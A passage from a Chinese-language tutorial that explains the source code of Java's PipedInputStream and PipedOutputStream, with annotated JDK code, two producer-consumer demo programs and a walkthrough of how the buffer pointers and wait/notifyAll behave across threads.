但是，同一批（多个）线程相互之间会存在竞争，比如，同一批向PipedOutputStream写入数据的线程会存在竞争，同一批从PipedInputStream读取数据的线程也会存在竞争。因此PipedInputStream和PipedOutputStream中的线程安全需要通过synchronized关键字和wait()/notifyAll()机制实现。不建议在一个线程中同时使用PipedInputStream和PipedOutputStream，因为这样可能会导致这个线程陷入死锁状态。<br />\n  PipedInputStream和PipedOutputStream之间的通信本质上是一个生产者-消费者模型，其中PipedOutputStream作为生产者，PipedInputStream作为消费者。两者通过一个循环缓冲区（byte[]数组）进行数据交换，PipedOutputStream将数据缓存在PipedInputStream的数组当中，等待PipedInputStream的读取。<br />\n  PipedInputStream和PipedOutputStream的UML关系图，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h4 id=\"一pipedoutputstream生产者源码向pipedinputstream消费者中的缓冲区byte数组写入字节数据的输出stream生产者\">一、PipedOutputStream（生产者）源码——向PipedInputStream（消费者）中的缓冲区（byte[]数组）写入字节数据的输出Stream（生产者）</h4>\n<pre><code>package java.io;\n\nimport java.io.*;\n\npublic\nclass PipedOutputStream extends OutputStream {\n    //与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）\n    private PipedInputStream sink;\n    \n    //构造函数\n    public PipedOutputStream(PipedInputStream snk)  throws IOException {\n        connect(snk);//调用connect()函数，来改变PipedInputStream （消费者）中一些变量的值\n    }\n    \n    //构造函数\n    public PipedOutputStream() {\n    }\n    \n    //线程同步函数：用来改变将要关联的PipedInputStream （消费者）中一些变量的值\n    public synchronized void connect(PipedInputStream snk) throws IOException {\n        if (snk == null) {\n            throw new NullPointerException();//如果将要关联的PipedInputStream （消费者）为null，抛出NullPointerException\n        } else if (sink != null || snk.connected) {\n            //如果与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）!=null或者将要关联的PipedInputStream （消费者）的boolean connected变量为true，则抛出IOException\n            throw new IOException(\"Already connected\");\n        }\n        sink = snk;//将这个PipedOutputStream（生产者）与这个PipedInputStream （消费者）相关联\n        snk.in = -1;//改变PipedInputStream （消费者）中的变量int in=-1\n        snk.out = 0;//改变PipedInputStream （消费者）中的变量int out=0\n        snk.connected = true;//改变PipedInputStream （消费者）中的变量boolean connected=true\n    }\n    \n    //向与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）的缓冲区（byte[]数组）写入1个字节\n    public void write(int b)  throws IOException {\n        if (sink == null) {\n             //如果与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）== null，抛出IOException\n            throw new IOException(\"Pipe not connected\");\n        }\n        sink.receive(b);//最终调用的是这个相关联的 PipedInputStream （消费者）的receive(int b)函数\n    }\n    \n    //向与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）的缓冲区（byte[]数组）写入byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置的字节\n    public void write(byte b[], int off, int len) throws IOException {\n        if (sink == null) {\n            //如果与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）== null，抛出IOException\n            throw new IOException(\"Pipe not connected\");\n        } else if (b == null) {\n            throw new NullPointerException();//如果byte[]数组b==null，抛出一个NullPointerException\n        } else if ((off &lt; 0) || (off &gt; b.length) || (len &lt; 0) ||\n                   ((off + len) &gt; b.length) || ((off + len) &lt; 0)) {//byte[]数组b的[off,off+len)（左闭右开）索引位置是否有越界的检查\n            throw new IndexOutOfBoundsException();//越界的话，抛出一个IndexOutOfBoundsException\n        } else if (len == 0) {\n            return;//如果len==0，结束本次函数调用\n        }\n        sink.receive(b, off, len);//最终调用的是这个相关联的 PipedInputStream （消费者）的receive(byte b[], int off, int len)函数\n    }\n    \n    //线程同步函数：使用notifyAll()函数唤醒所有与这个PipedOutputStream（生产者）相关联的 PipedInputStream （消费者）线程（这个消费者可以绑定1~多个线程）\n    public synchronized void flush() throws IOException {\n        if (sink != null) {\n            synchronized (sink) {\n                sink.notifyAll();\n            }\n        }\n    }\n    //关闭这个PipedOutputStream（生产者），这个PipedOutputStream（生产者）不能再向与它相关联的PipedInputStream（消费者）中的缓冲区（byte[]数组）写入字节数据\n    public void close()  throws IOException {\n        if (sink != null) {\n            sink.receivedLast();\n        }\n    }\n}\n</code></pre>\n<h4 id=\"二pipedinputstream消费者源码从自己的缓冲区byte数组读取字节数据的输入stream消费者\">二、PipedInputStream（消费者）源码——从自己的缓冲区（byte[]数组）读取字节数据的输入Stream（消费者）</h4>\n<pre><code>package java.io;\n\npublic class PipedInputStream extends InputStream {\n    //标记符：true表示与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）已经关闭，反之，反之\n    boolean closedByWriter = false;\n    //标记符：true表示当前这个 PipedInputStream （消费者）已经关闭了，反之，反之\n    volatile boolean closedByReader = false;\n    //标记符：true表示与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）已经持有了这个PipedInputStream （消费者）对象（或者叫已经连接上了），反之，反之\n    boolean connected = false;\n\n    Thread readSide;//当前消费的线程\n    Thread writeSide;//当前生产者的线程\n    \n    //默认的PipedInputStream （消费者）的缓冲区（byte[]数组）的长度\n    private static final int DEFAULT_PIPE_SIZE = 1024;\n\n    //PipedInputStream （消费者）的缓冲区（byte[]数组）\n    protected byte buffer[];\n    //缓冲区（byte[]数组）的写指针\n    protected int in = -1;\n    //缓冲区（byte[]数组）的读指针\n    protected int out = 0;\n    //构造函数\n    public PipedInputStream(PipedOutputStream src) throws IOException {\n        this(src, DEFAULT_PIPE_SIZE);//缓冲区（byte[]数组）的长度使用默认值1024\n    }\n\n    //构造函数\n    public PipedInputStream(PipedOutputStream src, int pipeSize)\n            throws IOException {\n         initPipe(pipeSize);//缓冲区（byte[]数组）的长度使用指定的长度\n         //最终还是调用PipedOutputStream（生产者）的connect()函数，并把自身对象this传递进去，然后在PipedOutputStream（生产者）的connect()函数中，改变自己的3个变量int in=-1、int out=0、boolean connected=true\n         connect(src);\n    }\n    \n    //构造函数，缓冲区（byte[]数组）的长度使用默认值1024\n    public PipedInputStream() {\n        initPipe(DEFAULT_PIPE_SIZE);\n    }\n\n    //构造函数，缓冲区（byte[]数组）的长度使用指定的长度\n    public PipedInputStream(int pipeSize) {\n        initPipe(pipeSize);\n    }\n    \n    //初始化缓冲区（byte[]数组）\n    private void initPipe(int pipeSize) {\n         if (pipeSize &lt;= 0) {\n            throw new IllegalArgumentException(\"Pipe Size &lt;= 0\");\n         }\n         buffer = new byte[pipeSize];\n    }\n\n    public void connect(PipedOutputStream src) throws IOException {\n        src.connect(this); //最终还是调用PipedOutputStream（生产者）的connect()函数，并把自身对象this传递进去，然后在PipedOutputStream（生产者）的connect()函数中，改变自己的3个变量int in=-1、int out=0、boolean connected=true\n    }\n    \n    //线程同步函数：该函数只被PipedOutputStream（生产者）的write(int b)函数调用\n    protected synchronized void receive(int b) throws IOException {\n        checkStateForReceive();//检查PipedInputStream （消费者）的状态\n        writeSide = Thread.currentThread();//当前执行该函数的线程，就是生产者线程\n        if (in == out)\n            //如果缓冲区（byte[]数组）的读指针==缓冲区（byte[]数组）的写指针，唤醒所有消费者线程，自己这个生产者线程调用wait(1000)函数\n            awaitSpace();\n        if (in &lt; 0) {//缓冲区（byte[]数组）的写指针&lt;0时，设置缓冲区（byte[]数组）的写指针=0，缓冲区（byte[]数组）的读指针=0\n            in = 0;\n            out = 0;\n        }\n        buffer[in++] = (byte)(b &amp; 0xFF);//向缓冲区的写指针位置写入1个字节\n        if (in &gt;= buffer.length) {\n            in = 0;//如果缓冲区满了，设置缓冲区的写指针=0\n        }\n    }\n\n    //线程同步函数：该函数只被PipedOutputStream（生产者）的write(byte b[], int off, int len)函数调用\n    synchronized void receive(byte b[], int off, int len)  throws IOException {\n        checkStateForReceive();//检查PipedInputStream （消费者）的状态\n        writeSide = Thread.currentThread();//当前执行该函数的线程，就是生产者线程\n        int bytesToTransfer = len;//生产者线程要写入到缓冲区（byte[]数组）中的字节总量\n        while (bytesToTransfer &gt; 0) {\n            if (in == out)\n                //如果缓冲区（byte[]数组）的读指针==缓冲区（byte[]数组）的写指针，唤醒所有消费者线程，自己这个生产者线程调用wait(1000)函数\n                awaitSpace();\n            int nextTransferAmount = 0;//本次生产者线程要写入到缓冲区（byte[]数组）中的字节数量\n            if (out &lt; in) {\n                //如果缓冲区的读指针&lt;缓冲区的写指针，本次要写入到缓冲区（byte[]数组）中的字节数量=缓冲区的长度-缓冲区的写指针\n                nextTransferAmount = buffer.length - in;\n            } else if (in &lt; out) {\n                if (in == -1) {\n                    in = out = 0;\n                    //如果缓冲区的读指针（out）&gt; 缓冲区的写指针（in）并且缓冲区的写指针（in）=-1，先设置缓冲区的读（out）、写（in）指针=0，本次要写入到缓冲区（byte[]数组）中的字节数量=缓冲区的长度\n                    nextTransferAmount = buffer.length - in;\n                } else {\n                    //如果缓冲区的读指针（out）&gt; 缓冲区的写指针（in）并且缓冲区的写指针（in）=-1，本次要写入到缓冲区（byte[]数组）中的字节数量=读指针（out）-写指针（in）\n                    nextTransferAmount = out - in;\n                }\n            }\n            //本次生产者线程要写入到缓冲区（byte[]数组）中的字节数量最多为len，下次为len-本次写入到缓冲区（byte[]数组）中的字节数量，也就是每次写入的基于len个字节循环递减上一次写入的\n            if (nextTransferAmount &gt; bytesToTransfer)\n                nextTransferAmount = bytesToTransfer;\n            assert(nextTransferAmount &gt; 0);\n            System.arraycopy(b, off, buffer, in, nextTransferAmount);//向缓冲区（byte[]数组）的[in,in+nextTransferAmount)索引位置写入byte[]数组b中[off,off+nextTransferAmount)索引位置的字节，都是左闭右开。\n            bytesToTransfer -= nextTransferAmount;//每一次都基于len个字节循环递减本次写入到缓冲区（byte[]数组）中的字节数量nextTransferAmount\n            off += nextTransferAmount;//将下次要从byte[]数组b中取字节的起始索引的位置（偏移量）+本次写入到缓冲区（byte[]数组）中的字节数量nextTransferAmount\n            in += nextTransferAmount;//将缓冲区的写指针（in）+本次写入到缓冲区（byte[]数组）中的字节数量nextTransferAmount\n            if (in &gt;= buffer.length) {\n                in = 0;//如果缓冲区的写指针（in）&gt; 缓冲区（byte[]数组）的长度，设置缓冲区的写指针（in）=0\n            }\n        }\n    }\n\n    //检查PipedInputStream （消费者）的状态\n    private void checkStateForReceive() throws IOException {\n        if (!connected) {\n            throw new IOException(\"Pipe not connected\");\n        } else if (closedByWriter || closedByReader) {\n            throw new IOException(\"Pipe closed\");\n        } else if (readSide != null &amp;&amp; !readSide.isAlive()) {\n            throw new IOException(\"Read end dead\");\n        }\n    }\n    \n    //如果缓冲区（byte[]数组）的读指针==缓冲区（byte[]数组）的写指针，唤醒所有消费者线程，自己这个生产者线程调用wait(1000)函数\n    private void awaitSpace() throws IOException {\n        while (in == out) {\n            checkStateForReceive();\n\n            /* full: kick any waiting readers */\n            notifyAll();\n            try {\n                wait(1000);\n            } catch (InterruptedException ex) {\n                throw new java.io.InterruptedIOException();\n            }\n        }\n    }\n    //关闭与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）\n    synchronized void receivedLast() {\n        closedByWriter = true;\n        notifyAll();//唤醒所有消费者线程\n    }\n    //线程同步函数：消费者线程每次从缓冲区（byte[]数组）中读取1个字节\n    public synchronized int read()  throws IOException {\n        if (!connected) {//检查标记符connected，如果为false，抛出IOException\n            throw new IOException(\"Pipe not connected\");\n        } else if (closedByReader) {//检查标记符closedByReader，如果为true，抛出IOException\n            throw new IOException(\"Pipe closed\");\n        } else if (writeSide != null &amp;&amp; !writeSide.isAlive()\n                   &amp;&amp; !closedByWriter &amp;&amp; (in &lt; 0)) {\n           //检查当前这个PipedInputStream （消费者）对象中引用的生产者线程和生产者线程的状态，如果和标记符closedByWriter还有缓冲区（byte[]数组）的写指针（in）不能对应的话，抛出一个IOException\n            throw new IOException(\"Write end dead\");\n        }\n\n        readSide = Thread.currentThread();//当前执行该函数的线程，就是消费者线程\n        int trials = 2;//这是一个多次检测的策略变量，防止生产者线程没有关闭了与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）时便抛出IOException\n        //in=-1的情况有种：\n        //①、生产者线程还没有向缓冲区（byte[]数组）中写任何字节\n        //②、消费者线程从缓冲区（byte[]数组）中读完字节（byte）数据以后读指针（out）=写指针（in），那么，当前消费者线程会设置写指针（in）=-1\n        //③、消费者线程执行PipedInputStream 的close()函数后，关闭了这个 PipedInputStream （消费者）\n        while (in &lt; 0) {\n            if (closedByWriter) {\n                /* closed by writer, return EOF */\n                return -1;\n            }\n            if ((writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)) {\n                //多个消费者线程从缓冲区（byte[]数组）中读的时候，并且前一个消费者线程已经把缓冲区（byte[]数组）中写入的字节读完了，并且前一个线程设置了写指针（in）=-1，生产者线程也关闭了与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）时，抛出一个IOException\n                throw new IOException(\"Pipe broken\");\n            }\n            /* might be a writer waiting */\n            notifyAll();//此处的目的是为了唤醒所有生产者线程\n            try {\n                wait(1000);\n            } catch (InterruptedException ex) {\n                throw new java.io.InterruptedIOException();\n            }\n        }\n        int ret = buffer[out++] &amp; 0xFF;//获取缓冲区（byte[]数组）中读指针（out）索引位置的字节,并且将读指针（out）+1\n        if (out &gt;= buffer.length) {\n            out = 0;//如果读指针（out）&gt;=缓冲区（byte[]数组）的长度，设置读指针（out）=0\n        }\n        if (in == out) {\n            /* now empty */\n            in = -1;//如果消费者线程从缓冲区（byte[]数组）中读完字节（byte）数据以后读指针（out）=写指针（in），那么，当前消费者线程会设置写指针（in）=-1\n        }\n\n        return ret;\n    }\n\n    //线程同步函数：如果缓冲区（byte[]数组）中有足够多的字节的话（数量&gt;len），消费者线程每次从缓冲区（byte[]数组）中读取len个字节放到byte[]数组b的[off, off+len)索引位置（左闭右开，不包括off+len）\n    //如果缓冲区（byte[]数组）中字节的数量&lt;len个（比如有in（写指针）-out（读指针）个），消费者线程每次从缓冲区（byte[]数组）中读取（in-out）个字节放到byte[]数组b的[off, off+in-out)索引位置（左闭右开，不包括off+in-out）\n    public synchronized int read(byte b[], int off, int len)  throws IOException {\n        if (b == null) {\n            throw new NullPointerException();\n        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//byte[]数组b的[off,off+len)（左闭右开）索引位置是否有越界的检查\n            throw new IndexOutOfBoundsException();//越界的话，抛出一个IndexOutOfBoundsException\n        } else if (len == 0) {\n            return 0;//如果len==0，返回0\n        }\n\n        /* possibly wait on the first character */\n        int c = read();//先调用read()函数试探性从缓冲区（byte[]数组）中读1个字节\n        if (c &lt; 0) {\n            return -1;//如果试探性的从缓冲区（byte[]数组）中都读不到1个字节，返回-1\n        }\n        b[off] = (byte) c;//把试探性从缓冲区（byte[]数组）中读到的第1个字节放到byte[]数组b的off索引位置\n        int rlen = 1;//累计从缓冲区（byte[]数组）中读到的所有字节数量\n        while ((in &gt;= 0) &amp;&amp; (len &gt; 1)) {\n\n            int available;//本次执行System.arraycopy()函数可以从缓冲区（byte[]数组）中读到byte[]数组b中的字节数量\n\n            if (in &gt; out) {\n                available = Math.min((buffer.length - out), (in - out));\n            } else {\n                available = buffer.length - out;\n            }\n\n            // A byte is read beforehand outside the loop\n            if (available &gt; (len - 1)) {//减掉试探性从缓冲区（byte[]数组）中读到的第1个字节\n                available = len - 1;\n            }\n            System.arraycopy(buffer, out, b, off + rlen, available);\n            out += available;//读指针（out）+System.arraycopy()函数从缓冲区（byte[]数组）中读到byte[]数组b中的字节数量\n            rlen += available;//累计从缓冲区（byte[]数组）中读到的所有字节数量 + System.arraycopy()函数从缓冲区（byte[]数组）中读到byte[]数组b中的字节数量\n            len -= available;//len - System.arraycopy()函数从缓冲区（byte[]数组）中读到byte[]数组b中的字节数量\n\n            if (out &gt;= buffer.length) {\n                out = 0;//如果读指针（out）&gt;=缓冲区（byte[]数组）的长度，设置读指针（out）=0\n            }\n            if (in == out) {\n                /* now empty */\n                in = -1;//如果消费者线程从缓冲区（byte[]数组）中读完字节（byte）数据以后读指针（out）=写指针（in），那么，当前消费者线程会设置写指针（in）=-1\n            }\n        }\n        return rlen;//返回累计从缓冲区（byte[]数组）中读到的所有字节数量\n    }\n    \n    //线程同步函数：返回缓冲区（byte[]数组）中可以被消费者线程读取的字节数量\n    public synchronized int available() throws IOException {\n        if(in &lt; 0)\n            return 0;\n        else if(in == out)\n            return buffer.length;\n        else if (in &gt; out)\n            return in - out;\n        else\n            return in + buffer.length - out;\n    }\n    \n    //关闭这个 PipedInputStream （消费者），其实就是设置标记符closedByReader=true， 设置写指针（in）=-1\n    public void close()  throws IOException {\n        closedByReader = true;\n        synchronized (this) {\n            in = -1;\n        }\n    }\n}\n</code></pre>\n<h4 id=\"三1个线程向pipedoutputstream生产者写字节数据1个线程从pipedinputstream消费者读取字节数据的过程\">三、1个线程向PipedOutputStream（生产者）写字节数据，1个线程从PipedInputStream（消费者）读取字节数据的过程</h4>\n<h5 id=\"31非循环直接写和非循环直接读\">3.1、非循环直接写和非循环直接读</h5>\n<pre><code>package com.chelong.StreamAndReader;\n\nimport java.io.IOException;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\n\npublic class PipedTest {\n   public static void main(String[] args) throws IOException {\n      final PipedOutputStream output = new PipedOutputStream();\n      final PipedInputStream input = new PipedInputStream(output);\n      Thread thread1 = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               output.write(\"Hello world, pipe!\".getBytes());//write()函数是阻塞的\n            } catch (IOException e) {\n            }\n         }\n      });\n\n      Thread thread2 = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               int data = -1;\n               while ((data = input.read()) != -1) {//read()函数是阻塞的\n                  System.out.print((char) data);\n               }\n            } catch (IOException e) {\n            }\n         }\n      });\n\n      thread1.start();\n      thread2.start();\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  main线程构造PipedOutputStream（生产者）和PipedInputStream（消费者）的过程如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  向PipedOutputStream（生产者）写字节数据的生产者线程的执行过程如下：</p>\n<p><img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  从PipedInputStream（消费者）读取字节数据的消费者线程的执行过程如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"311非循环直接写和非循环直接读时1个生产者线程和1个消费者线程处理数据的过程\">3.1.1、非循环直接写和非循环直接读时1个生产者线程和1个消费者线程处理数据的过程</h6>\n<p>  Java 语言定义了 6 种线程状态, 在任意一个时间点, 一个线程只能有且只有其中的一种状态, 这 6 种状态分别如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>这 6 种线程状态的简单介绍，如下所示<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  JVM运行时内存结构主要包含了五个部分：程序计数器 （PC寄存器）、 JVM栈、Native方法栈、堆、 方法区。如下图所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>图中红色部分是线程私有区域，进入这个区域的数据不会出现线程竞争的关系。而绿色区域中的数据则被所有线程共享，其中Java堆中存放的是大量对象，方法区中存放class信息、常量、静态变量等数据。<br />\n  每个线程的线程栈中会存放函数（方法）的描述符，成员（本地）变量等，函数（方法）在线程栈中会通过压栈和弹栈来执行，除了8种（byte、short、int、long、float、double、boolean、char）基本的数据类型存储在线程栈中以外，其余的引用数据类型（对象）都存储在堆中，然后通过引用将堆中的对象和线程栈中的变量关联起来（也可以叫线程栈中的引用指向堆中的对象）。<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>那么，当使用者执行3.1中的代码时，1个生产者线程和1个消费者线程处理数据的过程如下：<br />\n①、main线程初始化一个缓冲区（byte[]数组），长度为1024（默认值），然后生产者线程通过不断的压栈来完成函数之间的调用，最终执行PipedInputStream.class::receive(byte b[], int off, int len)函数来对缓冲区（byte[]数组）进行填充，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>②、当生产者线程填充完缓冲区之后，写指针变量int in=17，读指针变量int out=0，Thread writeSide = 当前这个生产者线程（Thread）对象，生产者线程会把自己线程栈中修改的变量最终刷新到堆中PipedInputStream对象中，以确保其它消费者线程的线程栈从堆中读取这3个变量时，这3个变量已经为修改后的值，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>③、消费者线程读缓冲区（byte[]数组）的过程中会不断地执行out++（读指针）以读取缓冲区（byte[]数组）中的可用字节并返回，直到out（读指针）==in（写指针），修改in（写指针）=-1，并且每次同步执行PipedInputStream.class::read()函数时，都会更新Thread readSide = 当前这个消费者线程（Thread）对象，消费者线程也会把自己线程栈中修改的变量最终刷新到堆中PipedInputStream对象中，以确保其它消费者线程的线程栈从堆中读取这3个变量时，这3个变量已经为修改后的值，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>④、更新in（写指针）=-1后，消费者线程再次同步执行PipedInputStream.class::read()函数时，如果PipedInputStream::boolean closedByWriter变量为true，则会返回-1</p>\n<h5 id=\"32加锁循环写和非加锁循环读到byte数组b中再处理\">3.2、加锁循环写和非加锁循环读到byte[]数组b中再处理</h5>\n<pre><code>package com.chelong.pipe;\nimport java.io.IOException;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\n\npublic class PipeForTransferInThread {\n   public static void main(String[] args) throws IOException, InterruptedException {\n      final PipedOutputStream output = new PipedOutputStream();\n      final PipedInputStream input = new PipedInputStream(output);\n      //生产者线程\n      Thread producer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            for (int i = 0; i &lt; 3; i++) {\n               synchronized (input) {\n                  try {\n//                    input.wait();\n                     output.write(\"Hello world, pipe!\".getBytes());\n                     input.wait();//释放锁并无限等待，直到消费者线程consumer 执行notifyAll()函数来唤醒当前阻塞\n                  } catch (Exception e) {\n                     e.printStackTrace();\n                  }\n               }\n            }\n         }\n      },\"生产者线程\");\n      \n      //消费者线程\n      Thread consumer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               byte[] b = new byte[1024];//1KB\n               int readBytes = -1;\n               long lastTime = System.currentTimeMillis();\n               while ((readBytes = input.read(b, 0, b.length)) != -1) {\n                  long curTime = System.currentTimeMillis();\n                  System.out.print(Thread.currentThread().getName()+\"本次读取花费时间：\" + (curTime - lastTime) + \"ms，读到的数据是：\");\n                  lastTime = curTime;\n                  for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//模拟处理字节数据\n                  }\n                  System.out.println();\n               }\n            } catch (IOException e) {\n               e.printStackTrace();\n            }\n         }\n      },\"消费者线程\");\n      producer.start();//生产者线程启动\n      consumer.start();//消费者线程启动\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  main线程构造PipedOutputStream（生产者）和PipedInputStream（消费者）的过程可以参考3.1；<br />\n  向PipedOutputStream（生产者）写字节数据的生产者线程的执行过程可以参考3.1；<br />\n  从PipedInputStream（消费者）读取字节数据的消费者线程的执行过程如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"321加锁循环写和非加锁循环读到byte数组b中再处理时1个生产者线程和1个消费者线程处理数据的过程\">3.2.1、加锁循环写和非加锁循环读到byte[]数组b中再处理时1个生产者线程和1个消费者线程处理数据的过程</h6>\n<p>  标题3.2中的代码的整个执行过程如下：<br />\n①、main线程初始化一个缓冲区（byte[]数组），长度为1024（默认值），如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>②、然后生产者线程通过不断的压栈来完成函数之间的调用，最终执行PipedInputStream.class::receive(byte b[], int off, int len)函数来对缓冲区（byte[]数组）进行填充，并且先在自己的线程栈中更新in（写指针）=17，out（读指针）=0，writeSide=当前这个生产者线程（Thread）对象 如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>当生产者线程对缓冲区（byte[]数组）填充完成之后，再执行标题3.2中的代码</p>\n<pre><code>input.wait();\n</code></pre>\n<p>这行代码会释放锁并让生产者线程进入无限等待，直到消费者线程consumer执行notifyAll()函数来唤醒当前这个生产者线程。在这之前，生产者线程会将自己线程栈中的in（写指针）=17，out（读指针）=0，writeSide=当前这个生产者线程，这3个变量更新到主内存（也就是堆）中的PipedInputStream对象中。<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>③、消费者线程读缓冲区（byte[]数组）的过程也是通过不断的压栈来完成函数之间的调用，最终执行PipedInputStream::read()函数（试探性的读取1个字节）和PipedInputStream::read(byte b[], int off, int len)函数（读取剩余其它的字节）将步骤②中生产者线程写入到缓冲区（byte[]数组）中的17个字节读取出来<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<blockquote>\n<p>附言：最终消费者线程也会将自己线程栈中的in（写指针）= -1，out（读指针）= 17，writeSide=当前这个消费者线程，这3个变量更新到主内存（也就是堆）中的PipedInputStream对象中。</p>\n</blockquote>\n<p>因此，本次消费者线程从缓冲区（byte[]数组）中读数据的过程中没有执行read()函数中的wait(1000)这一行代码，如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>所以，本次消费者线程从缓冲区（byte[]数组）中读取数据到消费者线程中自己创建的byte[]数组中时，只花费了0ms：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>接下来，当消费者线程将步骤②中生产者线程写入到缓冲区（byte[]数组）中的17个字节读取出来以后（通过System.arraycopy()函数复制到了消费者线程中自己创建的byte[]数组中），消费者线程会遍历从缓冲区读到的这个byte[]数组，来处理这些数据，如下所示（标题3.2中的代码片段）：</p>\n<pre><code>                   //标题3.2中的代码片段\n                   for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//模拟处理字节数据\n                  }\n</code></pre>\n<p>然后，当消费者线程再次执行</p>\n<pre><code>//标题3.2中的代码片段\ninput.read(b, 0, b.length)\n</code></pre>\n<p>从缓冲区（byte[]数组）中读数据到自己创建的byte[]数组中时，由于此时in（写指针）=-1，并且当下图中的其它5个条件都不成立时，唤醒执行了</p>\n<pre><code>input.wait()\n</code></pre>\n<p>的生产者线程，然后当前这个正在从缓冲区(byte数组)中读数据的消费者线程执行wait 1000ms ，如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>④、当生产者线程被消费者线程执行的</p>\n<pre><code>notifyAll();\n</code></pre>\n<p>唤醒之后，会再次通过不断的压栈来完成函数之间的调用，再次执行PipedInputStream.class::receive(byte b[], int off, int len)函数来对缓冲区（byte[]数组）进行填充，并且先在自己的线程栈中先更新in（写指针）=17，out（读指针）=0，writeSide=当前这个生产者线程（Thread）对象 如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>当生产者线程对缓冲区（byte[]数组）填充完成之后，再执行标题3.2中的代码</p>\n<pre><code>input.wait();\n</code></pre>\n<p>这行代码会释放锁并让生产者线程进入无限等待，直到消费者线程consumer执行notifyAll()函数来唤醒当前这个生产者线程。在这之前，生产者线程会将自己线程栈中的in（写指针）=17，out（读指针）=0，writeSide=当前这个生产者线程，这3个变量更新到主内存（也就是堆）中的PipedInputStream对象中。如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>⑤、消费者线程在第③步执行了</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>在等待了1000ms之后，消费者线程会自动唤醒继续执行，此时自己线程栈中的in（写指针）= -1，out（读指针）= 17已经被第④步中的生产者线程修改为in（写指针）=17，out（读指针）=0（生产者线程不会直接修改消费者线程栈中的变量，生产者线程会先将自己线程栈中in（写指针），out（读指针）变量的值修改到主内存中，然后消费者线程会自己将主内存中的这2个变量值刷新到消费者自己的线程栈中），如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>然后执行PipedInputStream::read()函数（试探性的读取1个字节）和PipedInputStream::read(byte b[], int off, int len)函数（读取剩余其它的字节）将步骤④中生产者线程写入到缓冲区（byte[]数组）中的17个字节读取出来<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<blockquote>\n<p>附言：最终消费者线程也会将自己线程栈中的in（写指针）= -1，out（读指针）= 17，writeSide=当前这个消费者线程，这3个变量更新到主内存（也就是堆）中的PipedInputStream对象中。</p>\n</blockquote>\n<p>由于，本次消费者线程从缓冲区（byte[]数组）中读数据的过程是从步骤③中自动唤醒继续执行的，所以，本次消费者线程从缓冲区（byte[]数组）中读取数据到消费者线程中自己创建的byte[]数组中时，花费了1015ms：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>接下来，当消费者线程将步骤④中生产者线程写入到缓冲区（byte[]数组）中的17个字节读取出来以后（通过System.arraycopy()函数复制到了消费者线程中自己创建的byte[]数组中），消费者线程会遍历从缓冲区读到的这个byte[]数组，来处理这些数据，如下所示（标题3.2中的代码片段）：</p>\n<pre><code>                   //标题3.2中的代码片段\n                   for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//模拟处理字节数据\n                  